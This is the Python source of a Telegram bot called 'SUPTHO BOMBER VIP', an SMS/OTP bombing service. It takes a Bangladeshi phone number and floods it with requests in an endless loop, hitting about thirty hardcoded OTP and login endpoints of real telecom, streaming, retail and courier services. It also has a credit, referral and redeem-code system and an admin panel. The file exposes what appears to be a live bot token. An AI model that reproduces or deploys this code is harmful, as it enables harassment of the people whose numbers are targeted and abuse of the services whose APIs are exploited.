import telebot
import requests
import threading
import time
import json
import random
import string
import os
import html
from flask import Flask
from telebot import types

# ==========================================
# 🔧 CONFIGURATION (SETTINGS)
# ==========================================
API_TOKEN = '8577991344:AAGdkMNIt1v-bSBgsQKQSjGOtaklWAYn5NI'   # <--- Bot Token দিন
OWNER_ID = 6941003064               # <--- আপনার Telegram ID (Number)
OWNER_USERNAME = "Suptho1"          # <--- Admin Username
CHANNEL_ID = "@SH_tricks"           # <--- Channel Username
VERSION = "2.0 (Vip)"

bot = telebot.TeleBot(API_TOKEN)
DATA_FILE = 'data.json'
stop_flags = {}

# ==========================================
# 💾 DATABASE MANAGER
# ==========================================
def load_data():
    if not os.path.exists(DATA_FILE):
        return {"users": {}, "codes": [], "whitelist": [], "banned": []}
    try:
        with open(DATA_FILE, 'r') as f: return json.load(f)
    except: return {"users": {}, "codes": [], "whitelist": [], "banned": []}

def save_data(data):
    with open(DATA_FILE, 'w') as f: json.dump(data, f, indent=4)

db = load_data()

# ==========================================
# 🌐 WEB SERVER (Keep Alive)
# ==========================================
app = Flask('')
@app.route('/')
def home(): return "Bot is Running Successfully!"

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = threading.Thread(target=run_web_server)
    t.daemon = True
    t.start()

# ==========================================
# 🛡️ HELPER FUNCTIONS
# ==========================================
def is_joined(user_id):
    try:
        status = bot.get_chat_member(CHANNEL_ID, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

def get_user(user_id):
    str_id = str(user_id)
    if str_id not in db['users']:
        db['users'][str_id] = {"credits": 5, "joined": time.time(), "ref_by": None}
        save_data(db)
    return db['users'][str_id]

# ==========================================
# 🌐 API ENGINE (TURBO MODE)
# ==========================================
def api_hit(url, method, data=None, json=None):
    try:
        # Fast Timeout (2s)
        head = {"User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"}
        if method == "POST": requests.post(url, data=data, json=json, headers=head, timeout=2)
        else: requests.get(url, headers=head, timeout=2)
    except: pass

def attack_process(target, call_id):
    global stop_flags
    stop_flags[call_id] = False
    
    # Infinite Loop until Stopped
    while not stop_flags.get(call_id, False):
        # API List
        api_hit("https://api.apex4u.com/api/auth/login", "POST", json={"phoneNumber": target})
        if stop_flags.get(call_id, False): break 
        
        api_hit("https://shopbasebd.com/store/registration/sendOTP", "POST", data={"number": target, "_token": "ktrqcmKSAn8cP3vZvw3xkbav2ww65eRvaikWKDFo"})
        api_hit(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={target}", "GET")
        api_hit("https://web-api.banglalink.net/api/v1/user/otp-login/request", "POST", json={"mobile": target})
        api_hit("https://webloginda.grameenphone.com/backend/api/v1/otp", "POST", data={"msisdn": target})
        api_hit("https://www.bd.airtel.com/en", "POST", data=f'[{{"msisdn":"{target}"}}]', headers={"next-action": "7f9bab0f2f1355e3d2075f08076c20bed3e9ff8d7e"})
        api_hit("https://api.retail.jatri.co/auth/api/v1/send-otp", "POST", json={"phone": target, "purpose": "USER_LOGIN"})
        api_hit(f"https://chaldal.com/yolk/api-v4/Auth/RequestOtpVerificationWithApiKey?apiKey=0cAFcWeA6egvAsgG1hCZ6i...&phoneNumber=%2B88{target}", "POST")
        api_hit("https://prod-services.toffeelive.com/sms/v1/subscriber/otp", "POST", json={"target": "88"+target, "resend": False})
        api_hit("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", "POST", json={"number": "+88"+target})
        if stop_flags.get(call_id, False): break

        api_hit("https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code", "POST", json={"phoneNumber": "+88"+target, "platform": "MOBILE_WEB"})
        api_hit("https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web", "POST", json={"number": "+88"+target})
        api_hit("https://api.shikho.com/auth/v2/send/sms", "POST", json={"phone": "88"+target, "type": "student"})
        api_hit("https://bb-api.bohubrihi.com/public/activity/otp", "POST", json={"phone": target, "intent": "login"})
        api_hit("https://api.ostad.app/api/v2/user/with-otp", "POST", json={"msisdn": target})
        api_hit("https://cokestudio23.sslwireless.com/api/store-and-send-otp", "POST", json={"msisdn": "88"+target, "name": "User"})
        api_hit("https://apix.rabbitholebd.com/appv2/login/requestOTP", "POST", json={"mobile": "+88"+target})
        api_hit("https://api.osudpotro.com/api/v1/users/send_otp", "POST", json={"mobile": "+88-"+target, "deviceToken": "web"})
        if stop_flags.get(call_id, False): break

        api_hit(f"https://fundesh.com.bd/api/auth/generateOTP", "POST", json={"msisdn": "88"+target})
        api_hit("https://api.swap.com.bd/api/v1/send-otp", "POST", json={"phone": target})
        api_hit(f"https://www.rokomari.com/otp/send?emailOrPhone=88{target}", "GET")
        api_hit(f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={target}", "GET")
        api_hit("https://api.paragonfood.com.bd/auth/customerlogin", "POST", json={"emailOrPhone": target})
        api_hit("https://prod-api.viewlift.com/identity/signup?site=prothomalo", "POST", json={"requestType":"send","phoneNumber":"+88"+target})
        api_hit("https://app.eonbazar.com/api/auth/register", "POST", json={"mobile": target})
        api_hit("https://tracking.sundarbancourierltd.com/PreBooking/SendPin", "POST", json={"PreBookingRegistrationPhoneNumber": target})
        
        # No sleep for speed

# ==========================================
# 🤖 MAIN MENU & BUTTONS
# ==========================================
@bot.message_handler(commands=['start'])
def welcome(message):
    user_id = str(message.from_user.id)
    
    # Refer System
    if user_id not in db['users']:
        referrer = None
        if len(message.text.split()) > 1:
            referrer = message.text.split()[1]
            if referrer != user_id and referrer in db['users']:
                db['users'][referrer]['credits'] += 5
                try: bot.send_message(referrer, "🎉 New Referral! You got +5 Credits.")
                except: pass
        
        db['users'][user_id] = {"credits": 5, "joined": time.time(), "ref_by": referrer}
        save_data(db)

    # 🟢 NEW BUTTON LAYOUT
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    
    # Row 1
    markup.add(types.KeyboardButton("🚀 Start Bomb"))
    # Row 2 (Balance added here)
    markup.add(types.KeyboardButton("💳 My Balance"), types.KeyboardButton("👥 Refer to Earn"))
    # Row 3
    markup.add(types.KeyboardButton("💰 Redeem Credit"), types.KeyboardButton("👑 Admin"))

    safe_name = html.escape(message.from_user.first_name)
    
    text = f"🔥 <b>SUPTHO BOMBER VIP</b> 🔥\n\n👋 Welcome, <b>{safe_name}</b>\n\n👇 Select an option from below:"
    
    bot.send_message(message.chat.id, text, parse_mode='HTML', reply_markup=markup)

# ==========================================
# 🎮 BUTTON HANDLERS
# ==========================================

# 1. Start Bomb
@bot.message_handler(func=lambda message: message.text == "🚀 Start Bomb")
def start_bomb_handler(message):
    if not is_joined(message.from_user.id):
        return bot.reply_to(message, "❌ Please Join Channel First: @SH_tricks")
    msg = bot.reply_to(message, "💣 <b>Enter Target Number:</b>\n(e.g., 017xxxxxxxx)", parse_mode='HTML')
    bot.register_next_step_handler(msg, process_bombing)

def process_bombing(message):
    user_id = str(message.from_user.id)
    target = message.text.strip()
    
    if user_id in db['banned']: return bot.reply_to(message, "🚫 You are BANNED.")
    if target in db['whitelist']: return bot.reply_to(message, "🛡️ This number is PROTECTED.")
    if db['users'][user_id]['credits'] < 1: return bot.reply_to(message, "⚠️ Not enough credits! Please Refer or Redeem code.")
    if len(target) != 11 or not target.isdigit(): return bot.reply_to(message, "❌ Invalid Number format!")

    db['users'][user_id]['credits'] -= 1
    save_data(db)
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("⛔ STOP ATTACK", callback_data=f"stop_{user_id}"))
    
    bot.reply_to(message, f"🚀 <b>Attack Started!</b>\n🎯 Target: <code>{target}</code>\n⚡ Status: <b>TURBO MODE</b>", parse_mode='HTML', reply_markup=markup)
    threading.Thread(target=attack_process, args=(target, f"stop_{user_id}")).start()

# 2. CHECK BALANCE (NEW FEATURE)
@bot.message_handler(func=lambda message: message.text == "💳 My Balance")
def balance_handler(message):
    user_id = str(message.from_user.id)
    user = get_user(user_id)
    
    text = f"💳 <b>My Account Status</b>\n\n👤 Name: <b>{html.escape(message.from_user.first_name)}</b>\n🆔 ID: <code>{user_id}</code>\n💰 <b>Current Balance: {user['credits']} Credits</b>"
    
    bot.reply_to(message, text, parse_mode='HTML')

# 3. Refer
@bot.message_handler(func=lambda message: message.text == "👥 Refer to Earn")
def refer_handler(message):
    user_id = str(message.from_user.id)
    try: bot_username = bot.get_me().username
    except: bot_username = "YourBotUserName"
    link = f"https://t.me/{bot_username}?start={user_id}"
    bot.reply_to(message, f"🎁 <b>Refer & Earn</b>\n\nLink: <code>{link}</code>\n\nReward: +5 Credits per refer.", parse_mode='HTML')

# 4. Redeem
@bot.message_handler(func=lambda message: message.text == "💰 Redeem Credit")
def redeem_handler(message):
    msg = bot.reply_to(message, "🎁 <b>Enter Redeem Code:</b>", parse_mode='HTML')
    bot.register_next_step_handler(msg, process_code)

def process_code(message):
    code = message.text.strip()
    user_id = str(message.from_user.id)
    if code in db['codes']:
        db['codes'].remove(code)
        db['users'][user_id]['credits'] += 5
        save_data(db)
        bot.reply_to(message, "✅ <b>Success!</b> +5 Credits added.", parse_mode='HTML')
    else: bot.reply_to(message, "❌ Invalid Code.")

# 5. Admin Contact
@bot.message_handler(func=lambda message: message.text == "👑 Admin")
def admin_contact_handler(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("💬 Message Admin", url=f"https://t.me/{OWNER_USERNAME}"))
    bot.reply_to(message, f"👑 <b>Admin Contact</b>", parse_mode='HTML', reply_markup=markup)

# Stop Callback
@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def stop_callback(call):
    stop_flags[call.data] = True
    bot.edit_message_text("✅ <b>Attack Stopped!</b>", call.message.chat.id, call.message.message_id, parse_mode='HTML')

# ==========================================
# 👑 ADMIN PANEL
# ==========================================
@bot.message_handler(commands=['admin', 'gencodes', 'broadcast', 'ban', 'unban', 'white', 'unwhite'])
def admin_commands(message):
    if message.from_user.id != OWNER_ID: return
    args = message.text.split()
    cmd = args[0]
    try:
        if cmd == '/admin':
            bot.reply_to(message, "Commands:\n/gencodes <n>\n/broadcast <msg>\n/ban <id>\n/white <num>")
        elif cmd == '/gencodes':
            amount = int(args[1])
            new_codes = ["SUP-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6)) for _ in range(amount)]
            db['codes'].extend(new_codes)
            save_data(db)
            with open("codes.txt", "w") as f: f.write("\n".join(new_codes))
            with open("codes.txt", "rb") as f: bot.send_document(message.chat.id, f)
            os.remove("codes.txt")
        elif cmd == '/broadcast':
            msg = message.text.replace("/broadcast ", "")
            for uid in db['users']:
                try: bot.send_message(uid, f"📢 <b>NOTICE:</b>\n{msg}", parse_mode='HTML')
                except: pass
            bot.reply_to(message, "✅ Broadcast Done.")
        elif cmd == '/ban':
            db['banned'].append(args[1])
            save_data(db)
            bot.reply_to(message, "🚫 Banned.")
        elif cmd == '/unban':
            if args[1] in db['banned']: db['banned'].remove(args[1])
            save_data(db)
            bot.reply_to(message, "✅ Unbanned.")
        elif cmd == '/white':
            db['whitelist'].append(args[1])
            save_data(db)
            bot.reply_to(message, "🛡️ Whitelisted.")
        elif cmd == '/unwhite':
            if args[1] in db['whitelist']: db['whitelist'].remove(args[1])
            save_data(db)
            bot.reply_to(message, "🗑️ Removed.")
    except Exception as e: bot.reply_to(message, f"❌ Error: {e}")

# ==========================================
# 🔥 RUNNER
# ==========================================
if __name__ == "__main__":
    try: bot.remove_webhook()
    except: pass
    keep_alive()
    print("✅ Full Bot Running...")
    bot.polling(non_stop=True)
